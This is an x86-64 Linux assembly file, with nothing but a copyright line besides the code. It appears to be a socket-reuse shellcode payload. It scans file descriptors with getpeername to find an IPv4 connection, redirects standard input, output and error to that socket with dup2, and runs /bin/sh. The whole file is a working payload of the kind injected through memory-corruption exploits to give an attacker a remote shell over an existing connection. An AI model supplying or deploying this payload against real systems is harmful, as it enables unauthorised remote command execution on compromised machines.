#
# Copyright 2014 Joseph Landry
#

.set	SOCK_SIZE,16
.set	PF_INET,2
.set	SYS_DUP2,33
.set	SYS_GETPEERNAME,52
.set	SYS_EXECVE,59
.set	SYS_EXIT,60

.section .text
.global _start

_start:
	sub	$0x18,%rsp
	movq	$0,%r12

loop:
	movq	$SOCK_SIZE,SOCK_SIZE(%rsp)

	lea	16(%rsp),%rdx
	movq	%rsp,%rsi
	movq	%r12,%rdi
	movq	$SYS_GETPEERNAME,%rax
	syscall

	test	%rax,%rax
	jnz	continue

	movw	(%rsp),%ax
	cmpw	$PF_INET,%ax
	je	dup2

continue:
	inc	%r12
	cmpq	$0x10000,%r12
	je	exit1
	jmp	loop


dup2:
	movq	$0,%rsi
	movq	%r12,%rdi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

	movq	$1,%rsi
	movq	%r12,%rdi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

	movq	$2,%rsi
	movq	%r12,%rdi
	movq	$SYS_DUP2,%rax
	syscall

	cmp	$0,%rax
	jl	exit1

	
execve:
	pushq	$0
	mov	%rsp,%rdx
	pushq	$0
	mov	%rsp,%rsi
	lea	sh_string(%rip),%rdi
	movq	$SYS_EXECVE,%rax
	syscall
	
	
exit1:
	movq	$1,%rdi
	jmp	exit

exit0:
	movq	$0,%rdi

exit:
	movq	$SYS_EXIT,%rax
	syscall
	hlt

sh_string:
.ascii "/bin/sh\000"
